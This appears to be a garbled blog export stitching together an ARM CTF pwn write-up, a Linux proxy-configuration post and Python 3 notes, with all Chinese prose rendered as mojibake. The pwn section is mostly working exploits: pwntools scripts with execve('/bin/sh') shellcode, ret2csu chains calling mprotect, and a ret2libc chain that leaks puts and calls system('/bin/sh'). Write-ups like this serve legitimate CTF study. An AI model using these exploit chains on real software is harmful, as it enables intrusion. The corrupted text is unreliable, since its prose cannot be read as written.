pwn\n\né¢˜ç›®æ–‡ä»¶ï¼š[pwn](pwn)\n\n## åˆ†æ\n\næŸ¥çœ‹æ–‡ä»¶å±æ€§ã€IDAé€†å‘äºŒè¿›åˆ¶æ–‡ä»¶åˆ†æåï¼Œè°ƒè¯•ç»“æœå¦‚ä¸‹ï¼š\n\n- ç¨‹åºæœ‰ä¸¤æ¬¡è¾“å…¥ã€‚ç¬¬ä¸€æ¬¡è¾“å…¥å°†è¢«æ”¾åˆ°bssæ®µï¼Œé™åˆ¶äº†è¾“å…¥å¤§å°ä¸º0x200ã€‚è¿™é‡Œæ²¡æœ‰é—®é¢˜ã€‚\n\n- ç¬¬äºŒæ¬¡è¾“å…¥æ—¶ï¼Œå°†è¾“å…¥0x200å­—èŠ‚çš„æ•°æ®ç»™æ ˆä¸Šçš„å±€éƒ¨å˜é‡ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œæ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚\n\n  ```c\n  ssize_t sub_4007F0()\n  {\n    __int64 v1; // [xsp+10h] [xbp+10h] BYREF\n  \n    return read(0, &v1, 0x200uLL);\n  }\n  ```\n\n- å› æ­¤å°è¯•è°ƒè¯•è¾“å…¥è¶…é•¿å­—ç¬¦ä¸²æ˜¯å¦èƒ½æˆåŠŸè¦†ç›–è¿”å›åœ°å€ï¼ŒåŠ«æŒpcæŒ‡é’ˆã€‚å¦‚ä¸‹è¯æ˜è¾“å…¥ç¡®å®æ§åˆ¶äº†pcã€‚\n\n  ```shell\n  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n   X0   0x0\n  *X1   0x40007ffdb0 â—‚â€” 0x6161616261616161 ('aaaabaaa')\n  *X2   0x200\n  *X3   0x40009a21a8 â—‚â€” 0x0\n   X4   0x0\n   X5   0x0\n  *X6   0x400099eb00 â—‚â€” 0x0\n  *X7   0x4000000000\n  *X8   0x3f\n  *X9   0xffffffffffff\n  *X10  0x101010101010101\n   X11  0x0\n   X12  0x0\n  *X13  0x400082e048 â€”â–¸ 0x400082f1b0 â—‚â€” 0x0\n  *X14  0x400085a308 â—‚â€” 0x70737274735f5f00\n  *X15  0x400084ce08 â—‚â€” 0x0\n  *X16  0x411028 â€”â–¸ 0x400090b9c8 â—‚â€” 0xb0000483a9bd7bfd\n  *X17  0x400090b9c8 â—‚â€” 0xb0000483a9bd7bfd\n  *X18  0x367\n  *X19  0x400868 â—‚â€” stp    x29, x30, [sp, #-0x40]!\n   X20  0x0\n  *X21  0x400610 â—‚â€” movz   x29, #0\n   X22  0x0\n   X23  0x0\n   X24  0x0\n   X25  0x0\n   X26  0x0\n   X27  0x0\n   X28  0x0\n  *X29  0x6161617261616171 ('qaaaraaa')\n  *SP   0x40007ffe00 â—‚â€” 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaac\\n'\n  *PC   0x6161617461616173 ('saaataaa')\n  ```\n\n- ç¡®å®šåç§»é‡ï¼Œä¸º72\n\n  ```shell\n  >>> cyclic_find('saaa')\n  72\n  ```\n\n## åˆ©ç”¨\n\n### æ ‡å‡†qemuä¸Š\n\n**ret2shellcode**\n\n```python\nfrom pwn import *\ncontext(log_level='debug',arch='aarch64')\nio = process([\"qemu-aarch64\", \"-L\", \"/usr/aarch64-linux-gnu\",\"./pwn\"])\n\npayload =  \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\npayload += \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\npayload += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nio.sendlineafter(\"Name\",payload)\nio.sendline(b'a'*72+p64(0x411068))\nio.interactive()\n```\n\n[shellcodeæ¥æº](https://www.exploit-db.com/shellcodes/47048)\n\n### è¡¥ä¸qemuä¸Š\n\nè¡¥ä¸qemuä¸Šï¼Œbssæ®µä¸å¯æ‰§è¡Œã€‚è€ƒè™‘ä½¿ç”¨`mprotect()` å‡½æ•°å°†bssæ®µè®¾ç½®ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚\n\n```c\n#include <unistd.h>\n#include <sys/mmap.h>\nint mprotect(const void *start, size_t len, int prot);\n// æŠŠè‡ªstartå¼€å§‹çš„ã€é•¿åº¦ä¸ºlençš„å†…å­˜åŒºçš„ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸ºprotæŒ‡å®šçš„å€¼\n// å¯è¯»å¯å†™å¯æ‰§è¡Œæ—¶protåº”å½“ä¸º7\n```\n\n**ret2csu**\n\narmä¸‹çš„ret2csuå¯ä»¥å®ç°ä¸¤æ¬¡æ§åˆ¶æµåŠ«æŒï¼š1ã€ä»0x4008ccå¤„è¿›å…¥ï¼Œé€šè¿‡å¸ƒç½®å¥½æ ˆç©ºé—´æ§åˆ¶x19~x30å†…çš„å‡ ä¸ªå¯„å­˜å™¨ï¼Œå¹¶å°†x30è®¾ç½®ä¸º0x4008acï¼Œä»è€Œä½¿ç¨‹åºæ‰§è¡Œä¸Šé¢è¿™æ®µgadgetï¼›2ã€è¿›å…¥0x4008acåï¼Œw0/x1/x2/x3éƒ½ä¼šè¢«æ ˆç©ºé—´çš„å€¼ç»™è¦†ç›–ï¼Œå°†x3è®¾ç½®ä¸ºç›®æ ‡åœ°å€ï¼Œå¯ä»¥å®ç°**ç¬¬ä¸€æ¬¡æ§åˆ¶æµåŠ«æŒ**ï¼›3ã€`blr x3`è¿”å›åç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œå¦‚æœæ­¤æ—¶x19å’Œx20çš„å€¼ç›¸åŒï¼Œå°±åˆä¼šæ‰§è¡Œåˆ°0x4008ccï¼›4ã€æ­¤æ—¶ï¼Œé€šè¿‡å¸ƒç½®æ ˆç©ºé—´å¯ä»¥å†æ¬¡æ§åˆ¶x30ï¼Œå½“æ‰§è¡Œåˆ°retæ—¶ï¼Œå°±å®ç°äº†**ç¬¬äºŒæ¬¡æ§åˆ¶æµåŠ«æŒ**ã€‚\n\n```assembly\n.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60â†“j\n.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]\n.text:00000000004008B0                 MOV             X2, X22\n.text:00000000004008B4                 MOV             X1, X23\n.text:00000000004008B8                 MOV             W0, W24\n.text:00000000004008BC                 ADD             X19, X19, #1\n.text:00000000004008C0                 BLR             X3\n.text:00000000004008C4                 CMP             X19, X20\n.text:00000000004008C8                 B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3Câ†‘j\n.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]\n.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC                 RET\n```\n\nç”»ä¸ªå›¾è¡¨ç¤ºä¸€ä¸‹å®ç°ä¸¤æ¬¡æ§åˆ¶æµåŠ«æŒæ—¶ï¼Œæ ˆç©ºé—´çš„å¸ƒå±€ã€‚x29å¤„æ˜¯ä½åœ°å€ï¼Œx24å¤„æ˜¯é«˜åœ°å€ã€‚\n\n```\n           ç¬¬ ä¸€ æ®µ æ ˆ ç©º é—´\n\n +----+     +-----+\n | x0 +<----+ x24 |\n +----+     +-----+\n | x1 +<----+ x23 |\n +----+     +-----+\n | x2 +<----+ x22 |\n +----+     +-----+\n | x3 +<----+ x21 |   æ³¨ æ„ ï¼Œ è¿™ é‡Œ æ˜¯ å– [x21] ç»™ x3\n +----+     +-----+\n | 1  +<----+ x20 |\n +----+     +-----+\n | 0  +<----+ x19 |\n +----+     +-----+      +----------------------------+\n            | x30 +----->+ ä¸Š ä¸€ æ®µ gadgetï¼Œå ç§» 0x20å·¦ å³   |\n            +-----+      +----------------------------+\n            | x29 +----->+ anything                   |\n            +-----+      +----------------------------+\n\n\n\n           ç¬¬ äºŒ æ®µ æ ˆ ç©º é—´\n\n+-----+      +---------------------------------+\n| x24 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x23 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x22 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x21 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x20 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x19 +----->+ anything                        |\n+-----+      +---------------------------------+\n| x30 +----->+ ä¸‹ ä¸€ ä¸ª ç›® æ ‡ è·³ è½¬ åœ° å€ , å¦‚ shellcode |\n+-----+      +---------------------------------+\n| x29 +----->+ anything                        |\n+-----+      +---------------------------------+\n```\n\næ•´ç†ä¸€ä¸‹åˆ©ç”¨æ€è·¯ï¼š\n\n- ç¬¬ä¸€æ¬¡è¾“å…¥å°†shellcodeæ”¾å…¥bssæ®µ\n\n- ç¬¬äºŒæ¬¡è¾“å…¥æ—¶æº¢å‡ºè¦†ç›–è¿”å›åœ°å€ï¼ˆè‡³ret2csuï¼‰ï¼Œå¹¶å¸ƒç½®å¥½æ ˆç©ºé—´\n  1. ç¬¬ä¸€æ®µæ ˆç©ºé—´å®ç°è·³è½¬åˆ°ä¸‹ä¸€ä¸ªgadgetï¼Œå¹¶å°†å…³é”®å¯„å­˜å™¨èµ‹å€¼\n  2. ç¬¬äºŒæ®µæ ˆç©ºé—´å®ç°ä¸€ä¸ªè·³è½¬ï¼Œä¸€èˆ¬æ˜¯è·³åˆ°shellcodeæˆ–æŸä¸ªå…³é”®å‡½æ•°åœ°å€ä¸Šæ‰§è¡Œ\n\næ¥ä¸‹æ¥ï¼Œåªéœ€è¦å¯¹ç…§ç€IDAä»”ç»†åœ°å°†æ ˆç©ºé—´å¸ƒç½®å¥½ï¼Œå°±å¯ä»¥äº†ã€‚expå¦‚ä¸‹\n\n```python\nfrom pwn import *\ncontext(arch='aarch64',log_level='debug')\n\n# myproc = process(['qemu-aarch64','-g','1234','-L','/usr/aarch64-linux-gnu/','./pwn'])\nmyproc = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','./pwn'])\n\nshellcode = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nshellcode += \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nshellcode += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\ninput1 = shellcode.ljust(0x50,'\\x00') + p64(0x4007e0)\n\n# å‡½æ•°è¿”å›æ—¶ï¼Œæ ˆç©ºé—´çš„SPæŒ‡å‘æ ˆä¸­â€œè¿”å›åœ°å€çš„ä¸Šä¸€ä¸ªâ€ï¼Œå› æ­¤æ„é€ çš„æ ˆç´§æŒ¨ç€è¦†ç›–çš„è¿”å›åœ°å€å¤„\npadding_func = 'a'*72 + p64(0x4008cc)\nstack1 = flat([0x0,0x4008ac,0x0,0x1,0x411068+0x50,0x7,0x1000,0x411000])\nstack2 = flat([0x0,0x411068,0x0,0x0,0x0,0x0,0x0,0x0])\n\ninput2 = padding_func + stack1 + stack2\nmyproc.sendafter('Name:',input1)\nmyproc.sendline(input2)\nmyproc.interactive()\n```\n\n# ç»ƒä¹ é¢˜ - melong\n\né¢˜ç›®æ–‡ä»¶ï¼š[melong.zip](melong.zip)\n\n## åˆ†æ\n\n`write_diary()`å‡½æ•°ä¸­ï¼Œread()çš„ç¬¬ä¸‰ä¸ªå‚æ•°nbytesæ¥è‡ªäºå‡½æ•°å‚æ•°ã€‚a2æ˜¯main()å‡½æ•°ä¸­çš„ä¸€ä¸ªå±€éƒ¨å˜é‡ã€‚\n\n```c\nDWORD *__fastcall write_diary(_DWORD *result, void *a2)\n{\n  unsigned __int8 nbytes; // [sp+Fh] [bp-5h]\n\n  nbytes = *result;\n  if ( nbytes )\n  {\n    read(0, a2, nbytes);\n    result = (_DWORD *)printf(\"you wrote %s\\n\", (const char *)a2);\n  }\n  return result;\n}\n```\n\nè·Ÿè¸ªåˆ°ä¸Šä¸€çº§ï¼Œæ¥è‡ªv8[0]ï¼Œå®ƒæ˜¯PT()å‡½æ•°çš„è¿”å›å€¼ã€‚\n\n```c\n          v8[0] = PT(v3);\n        else\nLABEL_5:\n          check_first(v3);\n        continue;\n      case 4:\n        if ( v8[0] )\n          write_diary(v8, v5);\n```\n\nPT()å‡½æ•°å†…éƒ¨ï¼Œå½“`ptr == exc2`æ—¶ï¼Œè¿”å›å€¼ä¸ºè¾“å…¥çš„sizeã€‚\n\n```c\n _isoc99_scanf(\"%d\", &size);\n  ptr = malloc(size);\n  if ( ptr == (void *)exc2 )\n  {\n    puts(\"Okay, start to exercise!\");\n    for ( i = 0; i < (int)size; ++i )\n    {\n      puts(\"you are getting healthy..\");\n      sleep(1u);\n    }\n    free(ptr);\n    v0 = size;\n  }\n......\n  return v0;\n```\n\nå› æ­¤ï¼Œåªè¦æ§åˆ¶`ptr == exec2`ï¼Œå°±å¯ä»¥åœ¨`write_diary()`å‡½æ•°ä¸­ï¼Œåˆ©ç”¨`read(0, a2, nbytes)`è¾¾åˆ°æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„ç›®çš„ã€‚\n\n> exec2æ˜¯bssæ®µçš„å€¼ï¼Œåˆå§‹åŒ–ä¸º0ã€‚å› æ­¤ï¼Œå½“malloc(size)æ‰§è¡Œå¤±è´¥æ—¶ï¼Œå°±å¯ä»¥è¾¾åˆ°ptr == exec2çš„ç›®çš„ã€‚\n\n## åˆ©ç”¨\n\n### æ–¹æ³•1 - ret2shellcode\n\nexpå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"arm\",log_level=\"debug\")\n\npr = process(['qemu-arm','-L','./','./melong'])\n#pr = process(['qemu-arm','-g','1234','-L','./','./melong'])\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(1))\npr.recvuntil(\"Your height(meters) : \")\npr.sendline(str(1.65))\npr.recvuntil(\"Your weight(kilograms) : \")\npr.sendline(str(100))\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(3))\npr.recvuntil(\"training?\")\npr.sendline(str(-1))\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(4))\n\nshellcode  = \"\\x02\\x20\\x42\\xe0\\x1c\\x30\\x8f\\xe2\"\nshellcode += \"\\x04\\x30\\x8d\\xe5\\x08\\x20\\x8d\\xe5\"\nshellcode += \"\\x13\\x02\\xa0\\xe1\\x07\\x20\\xc3\\xe5\"\nshellcode += \"\\x04\\x30\\x8f\\xe2\\x04\\x10\\x8d\\xe2\"\nshellcode += \"\\x01\\x20\\xc3\\xe5\\x0b\\x0b\\x90\\xef\"\nshellcode += \"/bin/sh\"\npayload = shellcode + 'a'*(84-len(shellcode))\npayload += p32(0xfffeef10)\npr.sendline(payload)\n\npr.recvuntil(\"Type the number:\")\npr.sendline(str(6))\n\npr.interactive()\n```\n\n### æ–¹æ³•2 - æ³„éœ²libcä¸getshellåˆ†å¼€\n\næ³„éœ²libcï¼š\n\n- åˆ©ç”¨ä»£ç æ®µä¸­ çš„bl putsï¼Œæ„é€ puts(puts_got)\n\n- åˆ©ç”¨putsçš„plté¡¹ï¼Œputs(puts_got)\n- ~~libcä¸­çš„puts()å‡½æ•°ä¹Ÿæ˜¯å¯æ‰§è¡Œçš„ï¼Œä½†æ˜¯ç”±äºlibcåŸºå€è¿˜æœªæ³„éœ²ï¼Œä¸é€‚ç”¨äºè¿™é‡Œä½¿ç”¨~~\n\ngetshellï¼š\n\n- libcä¸­å¯»æ‰¾systemå’Œâ€œ/bin/shâ€\n\n- system(\"/bin/sh\")\n\n### æ–¹æ³•3 - æ³„éœ²libcä¸getshelläºŒåˆä¸€\n\nåœ¨ä»£ç æ®µå¯»æ‰¾ç‰¹æ®Š`bl puts`ä»£ç ï¼Œå¦‚0x110bcå¤„ã€‚ç‰¹æ®Šä¹‹å¤„åœ¨äºï¼Œæ‰§è¡Œå®Œputsåï¼Œä¼špop {r11,pc}ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»§ç»­æ§åˆ¶pcã€‚\n\n- åˆ©ç”¨`bl puts`æ³„éœ²libc\n- åˆ©ç”¨0x110c4å¤„çš„popå°†æ§åˆ¶æµé‡æ–°åŠ«æŒåˆ°mainï¼Œå½“å†æ¬¡æ ˆæº¢å‡ºæ—¶æ§åˆ¶æ‰§è¡Œsystem(\"/bin/sh\")\n\n```assembly\n.text:000110B0 check_first                             ; CODE XREF: main+10Câ†“p\n.text:000110B0                                         ; main+140â†“p\n.text:000110B0                 PUSH    {R11,LR}\n.text:000110B4                 ADD     R11, SP, #4\n.text:000110B8                 LDR     R0, =aCheckBmiFirst ; \"Check bmi first\"\n.text:000110BC                 BL      puts\n.text:000110C0                 NOP\n.text:000110C4                 POP     {R11,PC}\n```\n\nå®Œæ•´expå¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch=\"arm\",log_level=\"debug\")\n\nmyelf = ELF('./melong')\nmylibc = ELF('./lib/libc.so.6')\npr = process(['qemu-arm','-L','./','./melong'])\n#pr = process(['qemu-arm','-g','1234','-L','./','./melong'])\n\ndef myfunc(val1,val2,val3,val4):\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(1))\n    pr.recvuntil(\"Your height(meters) : \")\n    pr.sendline(str(1.65))\n    pr.recvuntil(\"Your weight(kilograms) : \")\n    pr.sendline(str(100))\n\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(3))\n    pr.recvuntil(\"training?\")\n    pr.sendline(str(-1))\n\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(4))\n\n    payload = 'a'*84\n    payload += p32(0x11bbc) + p32(val1) + p32(val2) + p32(val3) + p32(val4)\n    pr.sendline(payload)\n\n    pr.recvuntil(\"Type the number:\")\n    pr.sendline(str(6))\n\n\n# first time - leak libc and return to main\nmyfunc(0x2301c,0x110bc,0x0,0x110cc)    # 0x2301c:puts_got; 0x110bc:bl puts; 0x110cc:main\npr.recvline()\nlibc_puts = u32(pr.recvline()[:4])\nlibc_base = libc_puts - mylibc.symbols['puts']\n#log.warn(\"puts_libc: 0x{:x}\".format(libc_puts))\n#log.warn(\"libc_base: 0x{:x}\".format(libc_base))\nsys_addr = libc_base + mylibc.symbols['system']\nbinsh_addr = libc_base + 0x131bec\n\n# second time - system(\"/bin/sh\")\nmyfunc(binsh_addr,sys_addr,0x0,0x0)\n\npr.interactive()\n```\n\n## å‚è€ƒwp\n\n[ARM pwnå…¥é—¨](http://www.hackpluto.xyz/2020/04/26/ARM-pwn%E5%85%A5%E9%97%A8/#Codegate2018-melong)\n\n[ARMæ¶æ„ä¸‹çš„ Pwn çš„ä¸€èˆ¬è§£å†³æ€è·¯](https://www.anquanke.com/post/id/199112#h3-18)\n\n# pwndbgå¸¸ç”¨æŒ‡ä»¤\n\n```shell\ni r lr   # æŸ¥çœ‹lrå¯„å­˜å™¨çš„å€¼\np $lr    # æ‰“å°lrå¯„å­˜å™¨çš„å€¼ï¼ˆåè¿›åˆ¶ï¼‰\n```","categories":["CTF"]},{"title":"Linuxä¸‹çš„å„ç§ä»£ç†è®¾ç½®","url":"/2021/01/26/configure-proxy/","content":"\n## httpä»£ç†\n\n> socksä»£ç†çš„è¯ï¼ŒæŠŠhttpæ¢æˆsocksæˆ–è€…socks5å°±å¯ä»¥äº†\n\n- proxychains\n\n```shell\nsudo apt search proxychains\nsudo apt install xxx\nvim /etc/proxychains.conf\t# ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®ä»£ç†\n```\n\n- exportç¯å¢ƒå˜é‡\n\n```shell\n# è®¾ç½®\nexport http_proxy=ip:port\nexport https_proxy=ip:port\n## å¦‚æœä»£ç†æœåŠ¡å™¨éœ€è¦ç™»å½•ï¼š\nexport http_proxy=http://userName:password@proxyAddress:port\nexport https_proxy=http://userName:password@proxyAddress:port\n\n# å–æ¶ˆè®¾ç½®\nunset http_proxy \n## æˆ– \nunset https_proxy\n\n# æ°¸ä¹…åŠ å…¥\n## åœ¨shellé…ç½®æ–‡ä»¶.bashrcæˆ–è€….zshrcä¸­æ·»åŠ ä¸Šè¿°å†…å®¹\nvim ~/.bashrc\n```\n\n\n\n## gitä»£ç†\n\n- è®¾ç½® - æœ‰ç”¨æˆ·åå¯†ç \n\n```sh\ngit config --global user.name \"blingxxxxuanxxx\"\ngit config --global user.email \"xxx@163.com\"\nssh-keygen -t rsa -b 4096 -C \"xxx@163.com\"\ngit config --global http.proxy http://ç”¨æˆ·å:å¯†ç @ip:port\ngit config --global https.proxy http://ç”¨æˆ·å:å¯†ç @ip:port\ngit config --global http.sslVerify false\n```\n\n- è®¾ç½® - æ— ç”¨æˆ·åå¯†ç æƒ…å†µ\n\n```shell\ngit config --global http.proxy http://ip:port\ngit config --global https.proxy http://ip:port\n```\n\n- æŸ¥çœ‹ä»£ç†ï¼š\n\n```shell\ngit config --global --get http.proxy\ngit config --global --get https.proxy\n```\n\n- å–æ¶ˆä»£ç†\n\n```shell\ngit config --global --unset http.proxy\ngit config --global --unset https.proxy\n```\n\n- å…¶ä»–å‘½ä»¤\n\n```shell\ngit config --list\n```\n\n\n\n## pip ä»£ç†\n\nä½¿ç”¨ `--proxy=ä»£ç†æœåŠ¡å™¨IP:ç«¯å£` çš„æ–¹å¼ï¼š\n\n```shell\nsudo /usr/bin/python3.6 -m pip --proxy=http://192.168.56.1:808 install --target /usr/local/lib/python3.6/dist-packages -Ur requirements.txt\n```\n\n\n\n## gem ä»£ç†\n\næ‰¾åˆ°gemæ–‡ä»¶ä½ç½®ï¼Œæ‰“å¼€gemæ–‡ä»¶ï¼Œåœ¨beginä¸‹æ·»åŠ argså¹¶é…ç½®ä»£ç†ï¼š\n\n```shell\nbling@Ubuntu2004:~$ which gem\n/usr/bin/gem\nbling@Ubuntu2004:~$ vim /usr/bin/gem\nbegin\n  args += ['--http-proxy','http://x.x.x.x:port']\t\t# æ·»åŠ è¿™ä¸€å¥\n  Gem::GemRunner.new.run args\nrescue Gem::SystemExitException => e\n  exit e.exit_code\nend\n```","categories":["åŸºç¡€æŠ€èƒ½"]},{"title":"python3å­¦ä¹ ","url":"/2021/01/23/study-python3/","content":"\nèŠ±äº†ä¸€å¤©ï¼Œå‚è€ƒW3Cschoolå­¦äº†ä¸‹python3çš„åŸºç¡€ï¼Œåšäº†ä¸ªç¬”è®°ç»™è‡ªå·±çœ‹ã€‚\n\n# æ¢ç´¢\n\n## python3ä¸‹å­—ç¬¦ä¸²ã€bytesã€hexä¹‹é—´çš„è½¬æ¢\n\n```\n      \"\".encode()                 b\"\".hex()\n  +----------------+     +- ------------------------+\n  |                |     |                          |\n  |                |     |                          |\n+-+--+           +-v-----+-+                  +-----v-----+\n| \"\" |           |  bytes  |                  |  hex str  |\n+-^--+           +-+-----^-+                  +-----+-----+\n  |                |     |                          |\n  |                |     |                          |\n  +----------------+     +--------------------------+\n     b\"\".decode()               bytes.fromhex(\"\")\n\n```\n\næœ€å·¦ä¾§æ˜¯strå¯¹è±¡ï¼Œä¸­é—´æ˜¯byteså¯¹è±¡ã€‚ä»–ä¿©ä¹‹é—´çš„è½¬æ¢é€šè¿‡encode()ä¸decode()å‡½æ•°ï¼Œå¯ä»¥æŒ‡å®šutf-8ï¼Œgbkï¼Œasciiç­‰ç¼–ç æ–¹å¼ã€‚\n\næœ€å³ä¾§æ˜¯hexè¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼Œåœ¨python3ä¸­å¯é€šè¿‡byteså¯¹è±¡è¿›è¡Œäº’ç›¸è½¬æ¢ã€‚\n\nè½¬æ¢ç¤ºä¾‹å¦‚ä¸‹ï¼š\n\n- str - bytes\n\n```shell\n>>> \"hello world\".encode()\nb'hello world'\n>>> \"hello world\".encode('gbk')\nb'hello world'\n>>> \"hello world\".encode('ascii')\t\t# è‹±æ–‡å­—ç¬¦çš„ç¼–ç å°±æ˜¯å®ƒè‡ªå·±\nb'hello world'\n>>> 'æˆ‘'.encode()\nb'\\xe6\\x88\\x91'\n>>> 'æˆ‘'.encode('utf-8')\t\t\t# str.encode()çš„é»˜è®¤ç¼–ç æ–¹å¼æ˜¯utf-8\nb'\\xe6\\x88\\x91'\n>>> 'æˆ‘'.encode('gbk')\nb'\\xce\\xd2'\n>>> 'æˆ‘'.encode('ascii')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nUnicodeEncodeError: 'ascii' codec can't encode character '\\u6211' in position 0: ordinal not in range(128)\n```\n\n- bytes - str\n\n```shell\n>>> b'\\xe6\\x88\\x91'.decode()\t\t# bytes.decode()çš„é»˜è®¤è§£ç æ–¹å¼æ˜¯utf-8\n'æˆ‘'\n>>> b'\\xce\\xd2'.decode('gbk')\n'æˆ‘'\n>>> b'\\xce\\xd2'.decode()\t\t\t# ä»¥gbkç¼–ç çš„å­—èŠ‚æµï¼Œè‹¥æœªæŒ‡å®šè§£ç æ–¹å¼ï¼Œé»˜è®¤ä»¥utf-8è§£ç æ—¶ä¼šå‡ºé”™\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nUnicodeDecodeError: 'utf-8' codec can't decode byte 0xce in position 0: invalid continuation byte\n```\n\n- bytes - hex\n\n```shell\n>>> b'\\xe6\\x88\\x91'.hex()\n'e68891'\n>>> b'hello world'.hex()\n'68656c6c6f20776f726c64'\n>>> b'\\xce\\xd2'.hex()\n'ced2'\n```\n\n- hex - bytes\n\n```shell\n>>> bytes.fromhex('e68891')\nb'\\xe6\\x88\\x91'\n>>> bytes.fromhex('68656c6c6f20776f726c64')\nb'hello world'\n>>> bytes.fromhex('ced2')\nb'\\xce\\xd2'\n```\n\npython3ä¸­å…¶ä»–æ–¹å¼ï¼š\n\n```shell\nimport codecs\n>>> codecs.encode(b'aaa','hex')\nb'616161'\n>>> codecs.decode(b'\\x61\\x61\\x61')\n'aaa'\n>>> codecs.decode(b'\\x61\\x61\\x61','utf-8')\n'aaa'\n```\n\npython2ä¸­ï¼š\n\n```shell\n>>> '\\x61\\x61\\x63'.decode()\nu'aac'\n>>> '616263'.decode('hex')\n'abc'\n>>> 'abc'.encode('hex')\n'616263'\n```\n\n# python3æ¨¡å—\n\n- keyword\n\n```shell\n>>> import keyword\n>>> keyword.kwlist\n['False', 'None', 'True', '__peg_parser__', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']\n```\n\n- sys\n\n```python\nimport sys\nfor i in sys.argv:\n    print(i)\nfor i in sys.path:\n    print(i)\nprint(sys.path)\n\nfrom sys import argv,path\nfor i in argv:\n    print(i)\nfor i in path:\n    print(i)\nprint(path)\n```\n\n- os\n\n```shell\nimport os\nos.system('ls')\n```\n\n# æ•°æ®ç±»å‹\n\n> Python ä¸­æœ‰å…­ä¸ªæ ‡å‡†çš„æ•°æ®ç±»å‹ï¼šNumberï¼ˆæ•°å­—ï¼‰ï¼ŒStringï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼ŒListï¼ˆåˆ—è¡¨ï¼‰ï¼ŒTupleï¼ˆå…ƒç»„ï¼‰ï¼ŒSetï¼ˆé›†åˆï¼‰ï¼ŒDictionaryï¼ˆå­—å…¸ï¼‰\n\nä¸å¯å˜æ•°æ®ï¼šNumberï¼ˆæ•°å­—ï¼‰ï¼ŒStringï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼ŒTupleï¼ˆå…ƒç»„ï¼‰\n\nå¯å˜æ•°æ®ï¼šListï¼ˆåˆ—è¡¨ï¼‰ï¼ŒSetï¼ˆé›†åˆï¼‰ï¼ŒDictionaryï¼ˆå­—å…¸ï¼‰\n\n```\nå¯é€šè¿‡type(xxx)æŸ¥çœ‹æ•°æ®ç±»å‹\n```\n\n## Number\n\n> python3æ”¯æŒintï¼Œfloatï¼Œboolï¼Œcomplex\n\n```shell\n>>> 5 + 4  # åŠ æ³•\n9\n>>> 4.3 - 2 # å‡æ³•\n2.3\n>>> 3 * 7  # ä¹˜æ³•\n21\n>>> 2 / 4  # é™¤æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªæµ®ç‚¹æ•°\n0.5\n>>> 2 // 4 # é™¤æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªæ•´æ•°\n0\n>>> 17 % 3 # å–ä½™ \n2\n>>> 2 ** 5 # ä¹˜æ–¹\n32\n```\n\n## String\n\n> ç”¨åŒå¼•å·æˆ–å•å¼•å·æ‹¬èµ·æ¥ï¼Œåæ–œæ `'\\'`ä½œä¸ºè½¬ä¹‰å­—ç¬¦å’Œç»­è¡Œç¬¦\n\n```shell\n>>> print('Hello\\nwroldï¼')\nHello\nworld!\n>>> 